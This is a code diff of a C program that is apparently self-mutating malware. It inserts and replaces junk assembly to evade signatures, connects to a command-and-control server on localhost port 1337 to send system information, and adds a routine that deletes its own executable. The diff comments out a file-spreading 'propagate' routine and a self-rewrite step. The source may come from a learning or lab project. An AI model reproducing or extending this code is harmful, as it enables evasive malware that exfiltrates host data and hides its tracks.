@@ -18,17 +18,10 @@
 
 /* Buffer size */
 #define BUF_SIZE 	1024
-/* Name of the original executable */
-unsigned char *original_executable;
 
 int 
 local_rand() {
   
-  /*
-    This program has such a short lifetime, srand(time(0)) simply isn't random
-    enough within a single execution of the program 
-  */
-
   int digit;
   FILE *fp;
   fp = fopen("/dev/urandom", "r");
@@ -77,7 +70,34 @@ insert_junk(uint8_t *file_data, uint64_t junk_start) {
 
 }
 
-/* Writes binary code to file */
+void 
+CommitSuicide() {
+
+  JUNK_ASM;
+
+
+    char path[256];
+    int status;
+
+    /* Get the path of the current program */
+    status = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if (status == -1) {
+       //  perror("Error getting path !!!!");
+        exit(EXIT_FAILURE);
+    }
+
+    /* Null-terminate the path and delete the file */
+    path[status] = '\0';
+    if (unlink(path) != 0) {
+        // perror("Error deleting !!!!");
+        exit(EXIT_FAILURE);
+    }
+
+    /* Exit the program */
+    exit(EXIT_SUCCESS);
+}
+
+/* 
 int32_t write_file(uint8_t *file_data, uint32_t file_len, const char *filename)
 {
   JUNK_ASM;
@@ -102,7 +122,7 @@ int32_t write_file(uint8_t *file_data, uint32_t file_len, const char *filename)
   free(newfilename);
   return EXIT_SUCCESS;
 
-}
+} */
 
 /* Load file in read binary mode */ 
 int32_t load_file(uint8_t **file_data, uint32_t *file_len, const char *filename) {
@@ -222,7 +242,7 @@ sys_info(int sockfd)
 }
 
 
-// Lists files in passed in directory path
+/* // Lists files in passed in directory path
 void propagate(const char *path, const char *exclude) {
 DIR *dir;
     struct dirent *ent;
@@ -241,7 +261,7 @@ DIR *dir;
                     // Ignore the executable that is running the program
                     if (strstr(exclude, ent->d_name) != NULL)
                     {
-                        original_executable = ent->d_name;  
+                        exec = ent->d_name;  
                     }
                 }
             }
@@ -251,7 +271,7 @@ DIR *dir;
         fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
         exit (EXIT_FAILURE);
     }
-}
+} */
 
 int main(int argc, char* argv[]) {
 
@@ -267,9 +287,9 @@ int main(int argc, char* argv[]) {
   // Replace the existing junk ASM sequences with new ones
   replace_junk(file_data, file_len);
 
-  propagate("./", argv[0]);  
+  // propagate("./", argv[0]);  
 
-  write_file(file_data, file_len, argv[0]);   
+  // write_file(file_data, file_len, argv[0]);   
 
                   
     int c2_fd;
@@ -281,14 +301,14 @@ int main(int argc, char* argv[]) {
         c2_fd = socket(AF_INET, SOCK_STREAM, 0);
 
         if (!c2_fd) {
-                remove(argv[0]);
+                CommitSuicide();
                 return 0;
         }
 
         c2_res = gethostbyname("localhost");
 
         if (!c2_res) {
-                remove(argv[0]);
+                CommitSuicide();
                 return 0;
         }
 
@@ -297,14 +317,14 @@ int main(int argc, char* argv[]) {
         addr.sin_port = htons(0x539);
 
         if (connect(c2_fd, (struct sockaddr *) &addr, sizeof(addr))) {
-                remove(argv[0]);
+                CommitSuicide();
                 return 0;
         }
 
         sys_info(c2_fd);
 
         close(c2_fd);
-        remove(argv[0]);
+        CommitSuicide();
 
   free(file_data);
   return EXIT_SUCCESS;
